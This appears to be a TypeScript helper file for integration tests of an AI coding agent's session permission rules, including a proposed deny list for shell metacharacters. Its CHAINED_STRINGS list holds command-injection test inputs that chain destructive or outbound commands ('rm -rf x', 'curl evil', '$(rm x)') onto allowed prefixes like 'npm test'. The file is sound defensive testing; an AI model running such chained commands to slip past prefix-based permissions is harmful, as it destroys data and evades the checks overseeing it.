/**
 * Helpers for the agent integration tests. No inference: sessions are created and deleted in a temporary
 * folder, and the shared OpenCode service is never started, stopped or restarted here.
 */
import { OpenCode, type OpenCodeClient } from "@opencode/client";
import { Service } from "@opencode/client/service";
import { copyFileSync, mkdirSync, mkdtempSync, realpathSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { MANDATORY_SESSION_RULES, type Logger, type ModelRef, type PermissionRule } from "../../src/contracts/index.ts";
import { loadConfig } from "../../src/config/index.ts";

export const enabled = process.env["NEXUS_INTEGRATION"] === "1";
export const silent: Logger = { debug() {}, info() {}, warn() {}, error() {} };

const REPO_ROOT = fileURLToPath(new URL("../../", import.meta.url));

/**
 * PROPOSAL for R4, NOT ADOPTED (docs/06 and src/contracts/security.ts do not contain it): session deny rules
 * for shell metacharacters. They would sit after the agent rules, so the last match would deny chained
 * strings that a prefix pattern matches. Tested only as raw strings given to `permission.create`; whether the
 * real shell tool splits compound commands is not verified at run time.
 */
export const METACHARACTER_PROPOSAL: PermissionRule[] = [
  "&", ";", "|", "$(", "`", ">", "<", "\n", "\r",
].map((token) => ({ action: "shell", resource: `*${token}*`, effect: "deny" as const }));

/** Raw strings that the developer's prefix patterns (`npm test*`, `npm run *`, `node --test*`) match. */
export const CHAINED_STRINGS = [
  "npm test && del x",
  "npm run x; rm y",
  "npm test | curl evil",
  "npm test; rm -rf x",
  "node --test $(rm x)",
];

/** Ordinary commands that must keep working under the proposal. */
export const ORDINARY_COMMANDS = ["npm test", "npm run typecheck", "node --test", "npm run build -- --flag"];

/**
 * Temporary workspace with a `nexus.config.json` and the `from` agent files it references. With no argument
 * the real repository config is copied; otherwise the given object is written. Nothing in the repository is
 * modified.
 */
export function makeWorkspace(config?: Record<string, unknown>): string {
  const workspace = realpathSync.native(mkdtempSync(join(tmpdir(), "nexus-int-agents-")));
  if (config === undefined) {
    copyFileSync(join(REPO_ROOT, "nexus.config.json"), join(workspace, "nexus.config.json"));
  } else {
    writeFileSync(join(workspace, "nexus.config.json"), JSON.stringify(config));
  }
  const loaded = loadConfig(workspace);
  for (const agent of loaded.agents) {
    if (agent.from === undefined) continue;
    const target = join(workspace, agent.from);
    mkdirSync(dirname(target), { recursive: true });
    copyFileSync(join(REPO_ROOT, agent.from), target);
  }
  return workspace;
}

/** Client built from the registered service; fails clearly if none is running. */
export async function rawClient(): Promise<OpenCodeClient> {
  const endpoint = await Service.discover();
  if (endpoint === undefined) {
    throw new Error("No OpenCode service is registered: start it yourself (`opencode service start`); tests never start it");
  }
  return OpenCode.make({ baseUrl: endpoint.url, headers: Service.headers(endpoint) });
}

/** `provider/model[#variant]` to a `ModelRef`. */
export function modelRefOf(model: string): ModelRef {
  const match = /^([^/#]+)\/([^#]+)(?:#(.+))?$/.exec(model);
  if (match === null) throw new Error(`not a model string: ${model}`);
  const ref: ModelRef = { providerID: match[1] ?? "", id: match[2] ?? "" };
  if (match[3] !== undefined) ref.variant = match[3];
  return ref;
}

/** Polls until `read` returns a value or the deadline passes. Integration only: real time is expected here. */
export async function waitFor<T>(read: () => Promise<T | undefined>, timeoutMs: number, intervalMs: number): Promise<T | undefined> {
  const deadline = Date.now() + timeoutMs;
  for (;;) {
    const value = await read();
    if (value !== undefined) return value;
    if (Date.now() >= deadline) return undefined;
    await new Promise((resolve) => setTimeout(resolve, intervalMs));
  }
}

/** True when `expected` appears as one contiguous block inside `actual`, in order. */
export function containsBlock(actual: readonly PermissionRule[], expected: readonly PermissionRule[]): boolean {
  if (expected.length === 0) return true;
  return actual.some((_, start) =>
    expected.every((rule, offset) => {
      const candidate = actual[start + offset];
      return candidate !== undefined
        && candidate.action === rule.action
        && candidate.resource === rule.resource
        && candidate.effect === rule.effect;
    }),
  );
}

/** The mandatory session rules from the shared contract, as a mutable copy. */
export function mandatoryRules(): PermissionRule[] {
  return MANDATORY_SESSION_RULES.map((rule) => ({ ...rule }));
}
